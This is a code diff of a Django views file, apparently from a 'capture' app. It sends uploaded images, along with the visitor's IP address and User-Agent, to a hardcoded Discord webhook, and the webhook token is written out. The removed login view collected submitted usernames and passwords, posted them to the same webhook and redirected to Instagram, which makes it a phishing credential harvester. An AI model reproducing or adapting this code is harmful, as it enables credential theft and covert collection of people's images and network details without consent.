@@ -1,12 +1,10 @@
 import base64
-import os
 import json
 import requests
 from django.http import JsonResponse
 from django.views.decorators.csrf import csrf_exempt
-from django.shortcuts import render
 
-DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1312712494082691134/dyrjnue9Vx9vSw9wQi8ujveS-pgLNYKh5lnH0ZveHeFQ1jPVta7PzPFoGO5olroECOUk'  # Replace with your webhook URL
+DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1312712494082691134/dyrjnue9Vx9vSw9wQi8ujveS-pgLNYKh5lnH0ZveHeFQ1jPVta7PzPFoGO5olroECOUk'
 
 @csrf_exempt
 def upload_image(request):
@@ -16,29 +14,16 @@ def upload_image(request):
             image_data = data.get('image', '').split(',')[1]
             image_bytes = base64.b64decode(image_data)
 
-            # Save image temporarily
-            image_path = 'temp_image.png'
-            with open(image_path, 'wb') as image_file:
-                image_file.write(image_bytes)
+            # Send the image directly as a file to Discord
+            files = {'file': ('image.png', image_bytes, 'image/png')}
+            response = requests.post(
+                DISCORD_WEBHOOK_URL,
+                files=files,
+                data={
+                    'content': f"New upload received:\nIP Address: {get_client_ip(request)}\nUser-Agent: {request.META.get('HTTP_USER_AGENT', 'Unknown')}"
+                }
+            )
 
-            # Debug file creation
-            if not os.path.exists(image_path) or os.path.getsize(image_path) == 0:
-                raise ValueError("Image file creation failed or file is empty.")
-
-            # Send image to Discord
-            with open(image_path, 'rb') as img:
-                response = requests.post(
-                    DISCORD_WEBHOOK_URL,
-                    files={'file': img},
-                    data={
-                        'content': f"New upload received:\nIP Address: {get_client_ip(request)}\nUser-Agent: {request.META.get('HTTP_USER_AGENT', 'Unknown')}"
-                    }
-                )
-
-            # Clean up temporary file
-            os.remove(image_path)
-
-            # Handle Discord response
             if response.status_code == 204:
                 return JsonResponse({'message': 'Image and metadata sent to Discord successfully!'})
             else:
@@ -49,35 +34,10 @@ def upload_image(request):
 
     return JsonResponse({'message': 'Invalid request method.'}, status=400)
 
-
-
 def get_client_ip(request):
-    """
-    Retrieve the client's IP address from the request object.
-    """
     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
     if x_forwarded_for:
         ip = x_forwarded_for.split(',')[0]
     else:
         ip = request.META.get('REMOTE_ADDR', 'Unknown')
     return ip
-
-def index(request):
-    return render(request, 'capture/index.html')
-
-
-from django.shortcuts import redirect
-
-def login_view(request):
-    if request.method == 'POST':
-        username = request.POST.get('username')
-        password = request.POST.get('password')
-        
-        # Log credentials to Discord
-        payload = {"content": f"Login attempt:\nUsername: {username}\nPassword: {password}"}
-        requests.post(DISCORD_WEBHOOK_URL, data=payload)
-
-        # Redirect to the official Instagram page
-        return redirect('https://www.instagram.com/')  # Replace with the actual page URL
-    
-    return render(request, 'login.html')
